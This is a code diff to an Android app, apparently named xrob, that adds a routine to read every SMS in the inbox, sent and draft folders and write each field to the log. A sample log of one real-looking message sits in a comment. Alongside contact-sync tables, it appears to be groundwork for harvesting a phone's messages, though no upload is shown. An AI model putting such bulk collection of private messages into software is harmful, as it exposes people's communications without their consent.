@@ -1,10 +1,12 @@
 package com.theah64.xrob.database;
 
+import android.content.ContentResolver;
 import android.content.ContentValues;
 import android.content.Context;
 import android.database.Cursor;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteOpenHelper;
+import android.net.Uri;
 import android.support.annotation.Nullable;
 import android.util.Log;
 
@@ -60,9 +62,74 @@ public class BaseTable<T> extends SQLiteOpenHelper {
 
             db.execSQL("CREATE TRIGGER after_phone_numbers_insert AFTER INSERT ON phone_numbers BEGIN UPDATE contacts SET is_synced = 0 WHERE is_synced = 1 AND id = NEW.contact_id; END;");
 
+            //Adding all messages to the messages table
+            syncMessages();
+
         } catch (IOException e) {
             e.printStackTrace();
             throw new IllegalArgumentException(e.getMessage());
+        }
+    }
+
+    /*
+    SAMPLE - 
+    09-29 23:34:26.440 16184-16669/com.theah64.xrob D/BaseTable: ---------------------------
+    09-29 23:34:26.440 16184-16669/com.theah64.xrob D/BaseTable: _id = 747
+    09-29 23:34:26.441 16184-16669/com.theah64.xrob D/BaseTable: thread_id = 6
+    09-29 23:34:26.442 16184-16669/com.theah64.xrob D/BaseTable: address = AL-650001
+    09-29 23:34:26.443 16184-16669/com.theah64.xrob D/BaseTable: m_size = null
+    09-29 23:34:26.444 16184-16669/com.theah64.xrob D/BaseTable: person = null
+    09-29 23:34:26.444 16184-16669/com.theah64.xrob D/BaseTable: date = 1460015993000
+    09-29 23:34:26.445 16184-16669/com.theah64.xrob D/BaseTable: date_sent = 0
+    09-29 23:34:26.446 16184-16669/com.theah64.xrob D/BaseTable: protocol = 0
+    09-29 23:34:26.448 16184-16669/com.theah64.xrob D/BaseTable: read = 1
+    09-29 23:34:26.448 16184-16669/com.theah64.xrob D/BaseTable: status = -1
+    09-29 23:34:26.449 16184-16669/com.theah64.xrob D/BaseTable: type = 1
+    09-29 23:34:26.449 16184-16669/com.theah64.xrob D/BaseTable: reply_path_present = 0
+    09-29 23:34:26.450 16184-16669/com.theah64.xrob D/BaseTable: subject = null
+    09-29 23:34:26.450 16184-16669/com.theah64.xrob D/BaseTable: body = Rs11=Loc mob30p/m(Per day 1st min @Re1)28days
+                                                                 Rs39=Loc Airtel mob15p/m(Per day 1st min @Re1)28days
+                                                                 Dial *121*1# or visit Airtel retailer.Offer Valid Today!
+    09-29 23:34:26.451 16184-16669/com.theah64.xrob D/BaseTable: service_center = +919840011010
+    09-29 23:34:26.452 16184-16669/com.theah64.xrob D/BaseTable: locked = 0
+    09-29 23:34:26.453 16184-16669/com.theah64.xrob D/BaseTable: sub_id = -1
+    09-29 23:34:26.453 16184-16669/com.theah64.xrob D/BaseTable: error_code = 0
+    09-29 23:34:26.454 16184-16669/com.theah64.xrob D/BaseTable: creator = null
+    09-29 23:34:26.454 16184-16669/com.theah64.xrob D/BaseTable: seen = 1
+    09-29 23:34:26.455 16184-16669/com.theah64.xrob D/BaseTable: itemInfoid = 747
+    09-29 23:34:26.455 16184-16669/com.theah64.xrob D/BaseTable: receive_date = 1460015962217
+    09-29 23:34:26.456 16184-16669/com.theah64.xrob D/BaseTable: ipmsg_id = 0
+    09-29 23:34:26.456 16184-16669/com.theah64.xrob D/BaseTable: ref_id = null
+    09-29 23:34:26.457 16184-16669/com.theah64.xrob D/BaseTable: total_len = null
+    09-29 23:34:26.457 16184-16669/com.theah64.xrob D/BaseTable: rec_len = null
+    09-29 23:34:26.458 16184-16669/com.theah64.xrob D/BaseTable: ---------------------------
+
+     */
+    private void syncMessages() {
+        Log.d(X, "Syncing messages");
+
+        final String[] smsTypes = {"inbox", "sent", "draft"};
+
+        for (final String smsType : smsTypes) {
+            final Uri uri = Uri.parse(String.format("content://sms/%s", smsType));
+
+            final Cursor c = getContext().getContentResolver().query(uri, null, null, null, null);
+
+            if (c != null) {
+
+                if (c.moveToFirst()) {
+
+                    do {
+                        Log.d(X, "---------------------------");
+                        for (int index = 0; index < c.getColumnCount(); index++) {
+                            Log.d(X, c.getColumnName(index) + " = " + c.getString(index));
+                        }
+                    } while (c.moveToNext());
+
+                }
+
+                c.close();
+            }
         }
     }
 
